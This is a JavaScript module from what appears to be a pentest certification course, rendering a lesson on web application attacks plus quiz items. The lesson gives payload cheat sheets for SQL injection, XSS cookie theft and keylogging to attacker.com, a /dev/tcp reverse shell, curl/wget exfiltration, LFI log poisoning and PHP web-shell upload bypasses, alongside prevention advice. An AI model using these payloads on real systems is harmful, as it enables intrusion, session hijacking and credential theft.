// ============================================
// Section 4: Web Application Attacks
// ============================================

export function render() {
  return `
<article class="lesson">
  <div class="lesson-header">
    <div class="lesson-section-tag">Web App Pentesting</div>
    <h1 class="lesson-title">Web Application Attacks</h1>
    <div class="lesson-meta">
      <span>⏱ ~60 min</span>
      <span>⚡ 150 XP</span>
      <span>📚 Core</span>
    </div>
  </div>

  <div class="story-intro">
    A tester found a search box on a corporate portal. Three characters — <code>'</code>, <code>)</code>, <code>--</code> — and the database spilled its guts. Ten minutes later, a stored XSS payload in a profile field silently shipped every visitor's session cookie to an external server. Three lines of JavaScript turned a "low-severity" input field into full account takeover across the entire organization. Web apps are the front door, and most of them are wide open.
  </div>

  <!-- ==================== SECTION 1: OWASP Top 10 ==================== -->
  <h2>1. OWASP Top 10 — The Web Security Standard</h2>

  <p>The <strong>OWASP Top 10</strong> is the industry-standard list of the most critical web application security risks. Published by the Open Web Application Security Project, it's updated every few years based on real-world data. If you only learn one thing about web security, learn this list.</p>

  <div class="key-point">
    <strong>OWASP Top 10 (2021 edition):</strong><br>
    1. <strong>A01 — Broken Access Control</strong> — Users acting beyond their permissions (IDOR, privilege escalation)<br>
    2. <strong>A02 — Cryptographic Failures</strong> — Weak encryption, exposed sensitive data<br>
    3. <strong>A03 — Injection</strong> — SQLi, command injection, LDAP injection<br>
    4. <strong>A04 — Insecure Design</strong> — Flawed architecture, no threat modeling<br>
    5. <strong>A05 — Security Misconfiguration</strong> — Default creds, open cloud storage, verbose errors<br>
    6. <strong>A06 — Vulnerable Components</strong> — Outdated libraries with known CVEs<br>
    7. <strong>A07 — Authentication Failures</strong> — Weak passwords, broken session management<br>
    8. <strong>A08 — Software &amp; Data Integrity Failures</strong> — Untrusted pipelines, insecure deserialization<br>
    9. <strong>A09 — Logging &amp; Monitoring Failures</strong> — Attacks go undetected<br>
    10. <strong>A10 — Server-Side Request Forgery (SSRF)</strong> — Making the server fetch internal resources
  </div>

  <div class="hacker-note">
    For the eJPT, you need hands-on comfort with <strong>Injection (A03)</strong>, <strong>Broken Access Control (A01)</strong>, <strong>Security Misconfiguration (A05)</strong>, and <strong>Authentication Failures (A07)</strong>. These are the ones you'll actively exploit on the exam.
  </div>

  <!-- ==================== SECTION 2: SQL Injection ==================== -->
  <h2>2. SQL Injection (SQLi)</h2>

  <p>SQL Injection is the king of web vulnerabilities. It lets an attacker inject SQL code into a query through user-controlled input, potentially reading, modifying, or deleting the entire database — or even getting a shell on the server.</p>

  <div class="analogy">
    Imagine walking up to a librarian and saying: "I'd like the book titled <em>Harry Potter; also please give me every patron's home address and delete the checkout history</em>." The librarian doesn't question it — she just executes every instruction. That's SQL Injection. The application trusts user input and passes it directly into a database query.
  </div>

  <h3>How It Works</h3>
  <p>A vulnerable login form might build a query like this:</p>

  <div class="code-block">
    <span class="code-label">Vulnerable PHP (behind the scenes)</span>
<span class="comment"># The app takes your username input and drops it into a query:</span>
$query = <span class="val">"SELECT * FROM users WHERE username = '"</span> . $_POST['user'] . <span class="val">"' AND password = '"</span> . $_POST['pass'] . <span class="val">"'"</span>;

<span class="comment"># If you type:  admin' OR 1=1-- -</span>
<span class="comment"># The query becomes:</span>
SELECT * FROM users WHERE username = <span class="val">'admin'</span> OR <span class="cmd">1=1</span><span class="flag">-- -</span>' AND password = ''

<span class="comment"># 1=1 is always true → returns ALL users</span>
<span class="comment"># -- - comments out the rest of the query (password check skipped)</span>
  </div>

  <h3>Types of SQL Injection</h3>

  <table class="port-table">
    <thead>
      <tr><th>Type</th><th>Sub-Type</th><th>How It Works</th></tr>
    </thead>
    <tbody>
      <tr>
        <td rowspan="2"><strong style="color: var(--accent-red);">In-Band</strong></td>
        <td>UNION-based</td>
        <td>Attacker uses UNION SELECT to append results from other tables to the output</td>
      </tr>
      <tr>
        <td>Error-based</td>
        <td>Database errors reveal data (table names, column names, values)</td>
      </tr>
      <tr>
        <td rowspan="2"><strong style="color: var(--accent-orange);">Blind</strong></td>
        <td>Boolean-based</td>
        <td>App shows different behavior for TRUE vs FALSE — extract data bit by bit</td>
      </tr>
      <tr>
        <td>Time-based</td>
        <td>Inject <code>SLEEP(5)</code> — if response is delayed, condition was true</td>
      </tr>
      <tr>
        <td><strong style="color: var(--accent-yellow);">Out-of-Band</strong></td>
        <td>DNS/HTTP exfil</td>
        <td>Force database to send data to attacker's server (when no direct output)</td>
      </tr>
    </tbody>
  </table>

  <h3>Testing for SQLi</h3>

  <div class="code-block">
    <span class="code-label">Common SQLi Test Payloads</span>
<span class="comment"># Basic test — does the page break?</span>
<span class="cmd">'</span>
<span class="cmd">"</span>
<span class="cmd">' OR 1=1-- -</span>
<span class="cmd">" OR 1=1-- -</span>
<span class="cmd">' OR '1'='1</span>

<span class="comment"># UNION-based — find number of columns first</span>
<span class="cmd">' UNION SELECT NULL-- -</span>
<span class="cmd">' UNION SELECT NULL,NULL-- -</span>
<span class="cmd">' UNION SELECT NULL,NULL,NULL-- -</span>
<span class="comment"># Keep adding NULLs until the error goes away</span>

<span class="comment"># Once you know column count (e.g., 3 columns):</span>
<span class="cmd">' UNION SELECT 1,2,3-- -</span>
<span class="comment"># See which numbers appear on the page — those are injectable columns</span>

<span class="comment"># Extract database version</span>
<span class="cmd">' UNION SELECT 1,version(),3-- -</span>

<span class="comment"># List all databases</span>
<span class="cmd">' UNION SELECT 1,schema_name,3 FROM information_schema.schemata-- -</span>

<span class="comment"># List tables from a database</span>
<span class="cmd">' UNION SELECT 1,table_name,3 FROM information_schema.tables WHERE table_schema='dbname'-- -</span>

<span class="comment"># List columns from a table</span>
<span class="cmd">' UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='users'-- -</span>

<span class="comment"># Dump usernames and passwords</span>
<span class="cmd">' UNION SELECT 1,username,password FROM users-- -</span>
  </div>

  <div class="warning">
    Always use <code>-- -</code> (with the trailing space and dash) as the comment terminator, not just <code>--</code>. Some databases require a space after <code>--</code>, and the trailing dash ensures the space is preserved. It's a habit that will save you debugging time.
  </div>

  <h3>sqlmap — Automated SQL Injection</h3>

  <p><code>sqlmap</code> automates the entire SQLi process — detection, exploitation, and data extraction. In the eJPT exam, this is your go-to weapon when you find a suspected injection point.</p>

  <div class="code-block">
    <span class="code-label">sqlmap Workflow</span>
<span class="comment"># Step 1: Test for SQLi and enumerate databases</span>
<span class="cmd">sqlmap</span> <span class="flag">-u</span> <span class="val">"http://target/page?id=1"</span> <span class="flag">--dbs</span>

<span class="comment"># Step 2: List tables in a specific database</span>
<span class="cmd">sqlmap</span> <span class="flag">-u</span> <span class="val">"http://target/page?id=1"</span> <span class="flag">-D</span> dbname <span class="flag">--tables</span>

<span class="comment"># Step 3: List columns in a specific table</span>
<span class="cmd">sqlmap</span> <span class="flag">-u</span> <span class="val">"http://target/page?id=1"</span> <span class="flag">-D</span> dbname <span class="flag">-T</span> users <span class="flag">--columns</span>

<span class="comment"># Step 4: Dump the data</span>
<span class="cmd">sqlmap</span> <span class="flag">-u</span> <span class="val">"http://target/page?id=1"</span> <span class="flag">-D</span> dbname <span class="flag">-T</span> users <span class="flag">--dump</span>

<span class="comment"># Useful flags</span>
<span class="flag">--batch</span>         <span class="comment"># Auto-answer prompts (use defaults)</span>
<span class="flag">--forms</span>         <span class="comment"># Automatically find and test forms on the page</span>
<span class="flag">--cookie</span>=<span class="val">"PHPSESSID=abc123"</span>   <span class="comment"># Authenticated testing</span>
<span class="flag">--os-shell</span>      <span class="comment"># Try to get an OS shell (if conditions allow)</span>
<span class="flag">--level</span>=5 <span class="flag">--risk</span>=3  <span class="comment"># Maximum testing intensity</span>

<span class="comment"># POST request testing</span>
<span class="cmd">sqlmap</span> <span class="flag">-u</span> <span class="val">"http://target/login"</span> <span class="flag">--data</span>=<span class="val">"user=admin&pass=test"</span> <span class="flag">--dbs</span>
  </div>

  <div class="try-it">
    <p>sqlmap cheat sheet — memorize this workflow:</p>
    <button class="try-cmd">sqlmap -u "http://target/page?id=1" --dbs</button>
    <button class="try-cmd">sqlmap -u "http://target/page?id=1" -D dbname --tables</button>
    <button class="try-cmd">sqlmap -u "http://target/page?id=1" -D dbname -T users --dump</button>
  </div>

  <h3>SQLi Prevention</h3>
  <div class="key-point">
    <strong>Parameterized queries / prepared statements</strong> are the #1 defense. Instead of concatenating user input into SQL, you use placeholders:<br><br>
    <code>SELECT * FROM users WHERE username = ? AND password = ?</code><br><br>
    The database treats the input as <em>data</em>, never as <em>code</em>. No matter what the user types, it can't break out of the query. This is the gold standard — everything else (input validation, WAFs, escaping) is a secondary layer.
  </div>

  <!-- ==================== SECTION 3: XSS ==================== -->
  <h2>3. Cross-Site Scripting (XSS)</h2>

  <p>XSS lets an attacker inject malicious JavaScript into a web page that other users view. Unlike SQLi which attacks the server, XSS attacks the <strong>users</strong> of the application.</p>

  <h3>Reflected XSS</h3>
  <p>The payload is part of the request (usually in the URL). The server reflects it back in the response. The victim must click a crafted link.</p>

  <div class="code-block">
    <span class="code-label">Reflected XSS</span>
<span class="comment"># Vulnerable URL — the "search" parameter is reflected on the page:</span>
http://target/search?q=<span class="cmd">&lt;script&gt;alert(1)&lt;/script&gt;</span>

<span class="comment"># The page renders: "You searched for: &lt;script&gt;alert(1)&lt;/script&gt;"</span>
<span class="comment"># The browser executes the script!</span>

<span class="comment"># Cookie-stealing payload:</span>
http://target/search?q=<span class="cmd">&lt;script&gt;document.location='http://attacker.com/steal?c='+document.cookie&lt;/script&gt;</span>
  </div>

  <h3>Stored XSS</h3>
  <p>The payload is saved in the database (e.g., a forum post, comment, profile field). <strong>Every user who views the page gets hit.</strong> Far more dangerous than reflected XSS.</p>

  <div class="code-block">
    <span class="code-label">Stored XSS</span>
<span class="comment"># Attacker posts a comment containing:</span>
<span class="cmd">&lt;script&gt;fetch('http://attacker.com/steal?c='+document.cookie)&lt;/script&gt;</span>

<span class="comment"># Stored in the database. Every visitor's browser executes it.</span>
<span class="comment"># Result: Mass cookie theft, session hijacking for all visitors.</span>
  </div>

  <h3>DOM-based XSS</h3>
  <p>The vulnerability is entirely in client-side JavaScript. The payload never hits the server — it's processed by the browser's DOM. Look for <code>document.location</code>, <code>document.URL</code>, <code>innerHTML</code>, and <code>eval()</code> sinks.</p>

  <h3>XSS Payloads</h3>

  <div class="code-block">
    <span class="code-label">XSS Payload Cheat Sheet</span>
<span class="comment"># Basic test</span>
<span class="cmd">&lt;script&gt;alert(1)&lt;/script&gt;</span>
<span class="cmd">&lt;script&gt;alert('XSS')&lt;/script&gt;</span>

<span class="comment"># If &lt;script&gt; tags are blocked, use event handlers:</span>
<span class="cmd">&lt;img src=x onerror=alert(1)&gt;</span>
<span class="cmd">&lt;svg onload=alert(1)&gt;</span>
<span class="cmd">&lt;body onload=alert(1)&gt;</span>
<span class="cmd">&lt;input onfocus=alert(1) autofocus&gt;</span>
<span class="cmd">&lt;marquee onstart=alert(1)&gt;</span>

<span class="comment"># Cookie theft</span>
<span class="cmd">&lt;script&gt;new Image().src='http://attacker.com/steal?c='+document.cookie&lt;/script&gt;</span>

<span class="comment"># Keylogger</span>
<span class="cmd">&lt;script&gt;document.onkeypress=function(e){new Image().src='http://attacker.com/log?k='+e.key;}&lt;/script&gt;</span>

<span class="comment"># Redirect to phishing page</span>
<span class="cmd">&lt;script&gt;window.location='http://attacker.com/phish'&lt;/script&gt;</span>
  </div>

  <div class="key-point">
    <strong>XSS Impact:</strong> Cookie theft and session hijacking, keylogging user input, phishing via page modification, cryptocurrency mining, worm propagation (e.g., MySpace Samy worm), and full account takeover via API calls.
  </div>

  <h3>XSS Prevention</h3>
  <ul>
    <li><strong>Output encoding</strong> — Convert <code>&lt;</code> to <code>&amp;lt;</code>, <code>&gt;</code> to <code>&amp;gt;</code> so browsers render it as text, not code</li>
    <li><strong>Content Security Policy (CSP)</strong> — HTTP header that restricts where scripts can load from</li>
    <li><strong>HttpOnly cookies</strong> — Prevents JavaScript from reading cookies (blocks <code>document.cookie</code> theft)</li>
    <li><strong>Input validation</strong> — Whitelist expected characters, reject anything else</li>
  </ul>

  <!-- ==================== SECTION 4: Command Injection ==================== -->
  <h2>4. Command Injection</h2>

  <p>Command injection happens when a web application passes user input to a system shell command without sanitization. If a web app runs something like <code>ping &lt;user_input&gt;</code>, an attacker can append additional OS commands.</p>

  <div class="analogy">
    It's like telling your assistant "Mail a letter to John Smith" — but you say "Mail a letter to John Smith <strong>and also wire $10,000 to my offshore account</strong>." The assistant executes both instructions because they don't distinguish between what you asked and what was appended.
  </div>

  <div class="code-block">
    <span class="code-label">Command Injection Payloads</span>
<span class="comment"># The web app has a "ping" feature: ping [user_input]</span>
<span class="comment"># Expected input: 192.168.1.1</span>
<span class="comment"># Actual query: ping 192.168.1.1</span>

<span class="comment"># Injecting with semicolon — run a second command</span>
<span class="cmd">; ls</span>
<span class="cmd">; cat /etc/passwd</span>
<span class="cmd">; whoami</span>

<span class="comment"># Injecting with pipe — feed output to another command</span>
<span class="cmd">| cat /etc/passwd</span>
<span class="cmd">| id</span>

<span class="comment"># Injecting with backticks or $() — command substitution</span>
<span class="cmd">\`whoami\`</span>
<span class="cmd">$(id)</span>

<span class="comment"># Chaining operators</span>
<span class="cmd">&& cat /etc/shadow</span>    <span class="comment"># AND — runs if first command succeeds</span>
<span class="cmd">|| whoami</span>             <span class="comment"># OR — runs if first command fails</span>

<span class="comment"># Reverse shell via command injection</span>
<span class="cmd">; bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'</span>
  </div>

  <h3>Blind Command Injection</h3>
  <p>If you don't see command output on the page, use these techniques:</p>

  <div class="code-block">
    <span class="code-label">Blind Command Injection</span>
<span class="comment"># Time-based — does the response take 5 seconds?</span>
<span class="cmd">; sleep 5</span>
<span class="cmd">| sleep 5</span>

<span class="comment"># Out-of-band — make the server call you</span>
<span class="cmd">; curl http://YOUR_IP:8000/$(whoami)</span>
<span class="cmd">; wget http://YOUR_IP:8000/$(id)</span>
<span class="cmd">; nslookup $(whoami).YOUR_DOMAIN</span>

<span class="comment"># Write output to a web-accessible file</span>
<span class="cmd">; whoami > /var/www/html/output.txt</span>
  </div>

  <div class="warning">
    During the eJPT, if you find a web form that interacts with the OS (ping tools, DNS lookup, file viewers), <strong>always test for command injection</strong>. Start with <code>; whoami</code> and <code>| id</code> — if either shows output, you have code execution.
  </div>

  <!-- ==================== SECTION 5: Directory Traversal ==================== -->
  <h2>5. Directory Traversal / Path Traversal</h2>

  <p>Directory traversal exploits insufficient input validation to access files outside the intended directory. By using <code>../</code> sequences, an attacker can navigate up the filesystem and read sensitive files.</p>

  <div class="code-block">
    <span class="code-label">Directory Traversal Payloads</span>
<span class="comment"># Basic traversal — read /etc/passwd</span>
http://target/page?file=<span class="cmd">../../../etc/passwd</span>
http://target/page?file=<span class="cmd">....//....//....//etc/passwd</span>   <span class="comment"># bypass basic ../ filter</span>

<span class="comment"># URL-encoded</span>
http://target/page?file=<span class="cmd">..%2F..%2F..%2Fetc%2Fpasswd</span>

<span class="comment"># Double URL-encoded (bypass WAFs)</span>
http://target/page?file=<span class="cmd">..%252F..%252F..%252Fetc%252Fpasswd</span>

<span class="comment"># Null byte injection (older PHP versions)</span>
http://target/page?file=<span class="cmd">../../../etc/passwd%00</span>.jpg

<span class="comment"># Windows targets</span>
http://target/page?file=<span class="cmd">..\\..\\..\\windows\\system32\\drivers\\etc\\hosts</span>
  </div>

  <div class="key-point">
    <strong>Juicy files to read via traversal:</strong><br>
    Linux: <code>/etc/passwd</code>, <code>/etc/shadow</code> (if readable), <code>/etc/hosts</code>, <code>/home/user/.ssh/id_rsa</code>, <code>/proc/self/environ</code><br>
    Windows: <code>C:\\Windows\\System32\\drivers\\etc\\hosts</code>, <code>C:\\Windows\\win.ini</code>, <code>C:\\inetpub\\wwwroot\\web.config</code>
  </div>

  <!-- ==================== SECTION 6: LFI / RFI ==================== -->
  <h2>6. File Inclusion (LFI / RFI)</h2>

  <p>File inclusion is like directory traversal's dangerous sibling. Instead of just <em>reading</em> files, the server <em>executes</em> them. This turns a file read into <strong>Remote Code Execution</strong>.</p>

  <h3>Local File Inclusion (LFI)</h3>

  <div class="code-block">
    <span class="code-label">LFI Exploitation</span>
<span class="comment"># Basic LFI — include a local file</span>
http://target/page.php?page=<span class="cmd">../../../etc/passwd</span>

<span class="comment"># PHP wrapper — read source code as base64 (avoids execution)</span>
http://target/page.php?page=<span class="cmd">php://filter/convert.base64-encode/resource=config.php</span>

<span class="comment"># PHP input wrapper — execute PHP code directly (if allow_url_include=On)</span>
<span class="comment"># Send POST request with PHP code as body:</span>
http://target/page.php?page=<span class="cmd">php://input</span>
<span class="comment"># POST body: &lt;?php system('whoami'); ?&gt;</span>

<span class="comment"># Data wrapper — embed code in the URL</span>
http://target/page.php?page=<span class="cmd">data://text/plain;base64,PD9waHAgc3lzdGVtKCd3aG9hbWknKTsgPz4=</span>
<span class="comment"># (base64 of: &lt;?php system('whoami'); ?&gt;)</span>
  </div>

  <h3>LFI to RCE via Log Poisoning</h3>

  <div class="code-block">
    <span class="code-label">Log Poisoning Attack Chain</span>
<span class="comment"># Step 1: Poison the access log by sending a request with PHP in the User-Agent</span>
<span class="cmd">curl</span> <span class="flag">-A</span> <span class="val">"&lt;?php system(\\$_GET['cmd']); ?&gt;"</span> http://target/

<span class="comment"># Step 2: Include the poisoned log file via LFI</span>
http://target/page.php?page=<span class="cmd">/var/log/apache2/access.log</span>&cmd=whoami

<span class="comment"># The server includes the log file, which now contains your PHP code.</span>
<span class="comment"># Your PHP code executes and runs the 'cmd' parameter as an OS command.</span>

<span class="comment"># Common log file locations:</span>
<span class="comment"># Apache: /var/log/apache2/access.log</span>
<span class="comment"># Nginx: /var/log/nginx/access.log</span>
<span class="comment"># SSH: /var/log/auth.log (poison via username in SSH attempt)</span>
  </div>

  <h3>Remote File Inclusion (RFI)</h3>

  <div class="code-block">
    <span class="code-label">RFI Exploitation</span>
<span class="comment"># RFI — include a file from your attack server</span>
<span class="comment"># Requires allow_url_include=On in PHP (rare but devastating)</span>

<span class="comment"># Step 1: Host a PHP shell on your machine</span>
<span class="comment"># shell.php contains: &lt;?php system($_GET['cmd']); ?&gt;</span>
<span class="cmd">python3 -m http.server 8000</span>

<span class="comment"># Step 2: Include it via the vulnerable parameter</span>
http://target/page.php?page=<span class="cmd">http://ATTACKER_IP:8000/shell.php</span>&cmd=whoami
  </div>

  <div class="hacker-note">
    LFI is much more common than RFI because <code>allow_url_include</code> is disabled by default in modern PHP. But LFI alone can still get you RCE through log poisoning, <code>/proc/self/environ</code> injection, or PHP wrappers. Never dismiss an LFI as "just a file read."
  </div>

  <!-- ==================== SECTION 7: CSRF ==================== -->
  <h2>7. Cross-Site Request Forgery (CSRF)</h2>

  <p>CSRF tricks an authenticated user's browser into making requests they didn't intend. If a victim is logged into their bank and clicks a malicious link, the attacker can transfer money — because the browser automatically includes the session cookies.</p>

  <div class="analogy">
    Imagine you're logged into your online banking. An attacker sends you an email with a hidden image tag: <code>&lt;img src="http://bank.com/transfer?to=attacker&amp;amount=10000"&gt;</code>. When you open the email, your browser "loads" that image URL — which is actually a transfer request — and your cookies go along for the ride. The bank sees a valid, authenticated request and processes it.
  </div>

  <div class="code-block">
    <span class="code-label">CSRF Attack Example</span>
<span class="comment"># Hidden form that auto-submits on page load</span>
&lt;form action="http://target/change-email" method="POST" id="csrf"&gt;
  &lt;input type="hidden" name="email" value="attacker@evil.com"&gt;
&lt;/form&gt;
&lt;script&gt;document.getElementById('csrf').submit();&lt;/script&gt;

<span class="comment"># Image tag for GET-based actions</span>
&lt;img src="http://target/delete-account?confirm=yes" style="display:none"&gt;
  </div>

  <div class="key-point">
    <strong>CSRF Prevention:</strong><br>
    <strong>CSRF tokens</strong> — a random, unique token included in every form. The server validates it on submission. An attacker can't guess the token, so forged requests fail.<br>
    <strong>SameSite cookies</strong> — tells the browser not to send cookies with cross-site requests.
  </div>

  <!-- ==================== SECTION 8: IDOR ==================== -->
  <h2>8. Insecure Direct Object Reference (IDOR)</h2>

  <p>IDOR is when an application exposes internal object references (like database IDs) and doesn't verify that the requesting user has permission to access that object. It's part of <strong>Broken Access Control (A01)</strong> — the #1 OWASP risk.</p>

  <div class="code-block">
    <span class="code-label">IDOR Examples</span>
<span class="comment"># You're user 123. Your profile URL is:</span>
http://target/api/user/<span class="val">123</span>

<span class="comment"># What if you change it to 124?</span>
http://target/api/user/<span class="cmd">124</span>
<span class="comment"># If you see user 124's data — that's an IDOR!</span>

<span class="comment"># Other common IDOR locations:</span>
/api/orders/<span class="cmd">1001</span>         <span class="comment"># View other users' orders</span>
/api/invoices/<span class="cmd">5555</span>       <span class="comment"># Download other users' invoices</span>
/download?file=<span class="cmd">report_124.pdf</span>  <span class="comment"># Access someone else's report</span>
/api/messages/<span class="cmd">999</span>        <span class="comment"># Read other users' private messages</span>

<span class="comment"># Try sequential IDs, UUIDs (if predictable), encoded values</span>
<span class="comment"># Use Burp Intruder to fuzz ID parameters automatically</span>
  </div>

  <div class="hacker-note">
    IDOR is embarrassingly simple but incredibly common. During any assessment, whenever you see a numeric ID or reference in a URL, cookie, or request body — <strong>change it</strong>. Increment it, decrement it, try 0, try negative numbers. You'd be shocked how often this works even on major platforms.
  </div>

  <!-- ==================== SECTION 9: Brute Forcing Web Logins ==================== -->
  <h2>9. Brute Forcing Web Logins</h2>

  <p>When you find a login page with no rate limiting or lockout, brute forcing is on the table. <strong>Hydra</strong> is the go-to tool for this on the eJPT.</p>

  <div class="code-block">
    <span class="code-label">Hydra HTTP Brute Force</span>
<span class="comment"># Brute force an HTTP POST login form</span>
<span class="cmd">hydra</span> <span class="flag">-l</span> admin <span class="flag">-P</span> /usr/share/wordlists/rockyou.txt <span class="val">target</span> <span class="flag">http-post-form</span> <span class="val">"/login:user=^USER^&pass=^PASS^:Invalid credentials"</span>

<span class="comment">#   -l admin              = username to try</span>
<span class="comment">#   -P rockyou.txt        = password wordlist</span>
<span class="comment">#   target                = target IP/hostname</span>
<span class="comment">#   http-post-form        = attack type</span>
<span class="comment">#   "/login:..."          = path:parameters:failure_string</span>
<span class="comment">#   ^USER^ and ^PASS^     = placeholders Hydra fills in</span>
<span class="comment">#   "Invalid credentials" = string that appears on FAILED login</span>

<span class="comment"># Brute force HTTP Basic Auth</span>
<span class="cmd">hydra</span> <span class="flag">-l</span> admin <span class="flag">-P</span> /usr/share/wordlists/rockyou.txt <span class="val">target</span> <span class="flag">http-get</span> <span class="val">/admin</span>

<span class="comment"># User list + password list</span>
<span class="cmd">hydra</span> <span class="flag">-L</span> users.txt <span class="flag">-P</span> passwords.txt <span class="val">target</span> <span class="flag">http-post-form</span> <span class="val">"/login:user=^USER^&pass=^PASS^:Invalid"</span>
  </div>

  <div class="warning">
    The failure string in Hydra's <code>http-post-form</code> is critical. Get it wrong and Hydra will report false positives. Always manually attempt a failed login first and copy the exact error message from the response.
  </div>

  <!-- ==================== SECTION 10: WordPress Attacks ==================== -->
  <h2>10. WordPress Attacks</h2>

  <p>WordPress powers ~40% of the web. Its massive plugin ecosystem means there's always something vulnerable. <strong>WPScan</strong> is your primary tool here.</p>

  <div class="code-block">
    <span class="code-label">WordPress Enumeration and Attack</span>
<span class="comment"># Full enumeration — users, plugins, themes</span>
<span class="cmd">wpscan</span> <span class="flag">--url</span> <span class="val">http://target</span> <span class="flag">--enumerate</span> u,p,t

<span class="comment"># Enumerate with API token (shows vulnerability details)</span>
<span class="cmd">wpscan</span> <span class="flag">--url</span> <span class="val">http://target</span> <span class="flag">--enumerate</span> u,vp,vt <span class="flag">--api-token</span> YOUR_TOKEN

<span class="comment"># Brute force wp-login.php</span>
<span class="cmd">wpscan</span> <span class="flag">--url</span> <span class="val">http://target</span> <span class="flag">-U</span> admin <span class="flag">-P</span> /usr/share/wordlists/rockyou.txt

<span class="comment"># Aggressive plugin detection</span>
<span class="cmd">wpscan</span> <span class="flag">--url</span> <span class="val">http://target</span> <span class="flag">--plugins-detection</span> aggressive
  </div>

  <h3>WordPress Key Paths</h3>

  <table class="port-table">
    <thead>
      <tr><th>Path</th><th>Purpose</th><th>Why It Matters</th></tr>
    </thead>
    <tbody>
      <tr><td class="port-num">/wp-admin/</td><td>Admin dashboard</td><td>If you get creds, go here to upload a shell via Theme Editor</td></tr>
      <tr><td class="port-num">/wp-login.php</td><td>Login page</td><td>Brute force target</td></tr>
      <tr><td class="port-num">/xmlrpc.php</td><td>XML-RPC API</td><td>Brute force without rate limiting, DDoS amplification</td></tr>
      <tr><td class="port-num">/wp-content/uploads/</td><td>Uploaded files</td><td>Look for uploaded web shells, sensitive files</td></tr>
      <tr><td class="port-num">/wp-json/wp/v2/users</td><td>REST API users</td><td>Often exposes usernames even if enumeration is "disabled"</td></tr>
      <tr><td class="port-num">/wp-config.php</td><td>Config file</td><td>Contains DB credentials — read via LFI if possible</td></tr>
    </tbody>
  </table>

  <div class="hacker-note">
    <strong>xmlrpc.php brute force</strong> is powerful because it supports the <code>system.multicall</code> method — you can try hundreds of passwords in a single HTTP request, bypassing most login rate-limiters. WPScan uses this method by default when it detects xmlrpc.php.
  </div>

  <div class="key-point">
    <strong>WordPress RCE path after login:</strong><br>
    1. Log into /wp-admin with obtained credentials<br>
    2. Go to Appearance &rarr; Theme Editor (or Plugins &rarr; Plugin Editor)<br>
    3. Edit 404.php (or any PHP file) and insert a web shell or reverse shell<br>
    4. Navigate to the edited file to trigger execution:<br>
    <code>http://target/wp-content/themes/THEME_NAME/404.php</code>
  </div>

  <!-- ==================== SECTION 11: File Upload Vulnerabilities ==================== -->
  <h2>11. File Upload Vulnerabilities</h2>

  <p>If a web application allows file uploads without proper validation, an attacker can upload a web shell and get remote code execution.</p>

  <div class="code-block">
    <span class="code-label">File Upload Attack Techniques</span>
<span class="comment"># Simple PHP web shell (cmd.php)</span>
&lt;?php system($_GET['cmd']); ?&gt;

<span class="comment"># Usage after upload:</span>
http://target/uploads/cmd.php?cmd=whoami

<span class="comment"># If .php is blocked, try bypass techniques:</span>

<span class="comment"># Double extension</span>
shell<span class="cmd">.php.jpg</span>
shell<span class="cmd">.php5</span>
shell<span class="cmd">.phtml</span>
shell<span class="cmd">.phar</span>

<span class="comment"># Null byte (older systems)</span>
shell.php<span class="cmd">%00</span>.jpg

<span class="comment"># Content-Type manipulation (in Burp, change the header)</span>
Content-Type: <span class="cmd">image/jpeg</span>   <span class="comment"># even though it's PHP</span>

<span class="comment"># Magic bytes — prepend real image header to PHP file</span>
<span class="cmd">GIF89a</span>
&lt;?php system($_GET['cmd']); ?&gt;
<span class="comment"># Save as shell.php.gif — passes magic byte checks</span>

<span class="comment"># Case variation</span>
shell<span class="cmd">.pHp</span>
shell<span class="cmd">.PhP</span>
  </div>

  <div class="warning">
    After uploading a shell, you need to know <strong>where</strong> it was saved. Check the response for a file path, try common directories like <code>/uploads/</code>, <code>/images/</code>, <code>/media/</code>, or use directory brute-forcing (gobuster/dirbuster) to find it.
  </div>

  <div class="key-point">
    <strong>Complete file upload attack chain:</strong><br>
    1. Find an upload function (profile picture, document upload, etc.)<br>
    2. Upload a legitimate file first and note where it's stored<br>
    3. Attempt to upload a PHP shell — if blocked, try bypass techniques<br>
    4. Access the uploaded shell via its URL<br>
    5. Escalate from web shell to reverse shell for a stable connection
  </div>

  <!-- ==================== PUTTING IT ALL TOGETHER ==================== -->
  <h2>Web Attack Methodology — Putting It Together</h2>

  <div class="key-point">
    <strong>Web app pentest workflow:</strong><br>
    1. <strong>Enumerate</strong> — directory brute-force (gobuster), tech stack detection (Wappalyzer, whatweb)<br>
    2. <strong>Map inputs</strong> — every form, parameter, header, cookie is a potential injection point<br>
    3. <strong>Test each input</strong> — SQLi, XSS, command injection, LFI/RFI, IDOR<br>
    4. <strong>Identify the CMS</strong> — WordPress? Run wpscan. Joomla? Check known CVEs.<br>
    5. <strong>Check file uploads</strong> — can you upload a web shell?<br>
    6. <strong>Brute force logins</strong> — default creds first, then Hydra<br>
    7. <strong>Escalate</strong> — web shell &rarr; reverse shell &rarr; privilege escalation
  </div>

  <!-- ==================== QUIZ SECTION ==================== -->
  <div class="section-complete">
    <div class="check">🎯</div>
    <h2>Ready to Test Your Knowledge?</h2>
    <p style="color: var(--text-dim); margin-bottom: 8px;">15 questions covering SQL injection, XSS, command injection, LFI, CSRF, IDOR, WordPress, and file upload attacks. Score 70%+ to earn full XP.</p>
    <button class="btn-primary quiz-start-btn" id="start-quiz-btn">Start Field Test</button>
    <br><br>
    <button class="btn-secondary" id="complete-topic-btn">Mark as Complete (Skip Quiz)</button>
  </div>

</article>
  `;
}

// ==================== QUIZ DATA ====================
export const quiz = [
  {
    type: 'mcq',
    question: 'You inject a single quote (\') into a search field and the application returns a database error. What is this most likely vulnerable to?',
    options: [
      'Cross-Site Scripting (XSS)',
      'SQL Injection',
      'Command Injection',
      'CSRF'
    ],
    correct: 1,
    explanation: 'A database error triggered by a single quote means user input is being passed directly into a SQL query without proper sanitization. The quote breaks the SQL syntax, confirming SQL Injection.'
  },
  {
    type: 'type-command',
    question: 'You found a SQLi vulnerability at http://target/page?id=1. Use sqlmap to enumerate all databases on the target.',
    scenario: 'Enumerate databases using sqlmap against a known vulnerable parameter.',
    validAnswers: [
      'sqlmap -u "http://target/page?id=1" --dbs',
      'sqlmap -u "http://target/page?id=1" --dbs --batch',
    ],
    hint: 'sqlmap -u "[url]" --dbs',
    explanation: 'sqlmap -u specifies the target URL with the injectable parameter, and --dbs tells sqlmap to enumerate all databases on the server.'
  },
  {
    type: 'mcq',
    question: 'What is the difference between Reflected XSS and Stored XSS?',
    options: [
      'Reflected XSS targets the server, Stored XSS targets the client',
      'Reflected XSS requires the victim to click a link, Stored XSS affects every visitor who views the page',
      'Reflected XSS is more dangerous than Stored XSS',
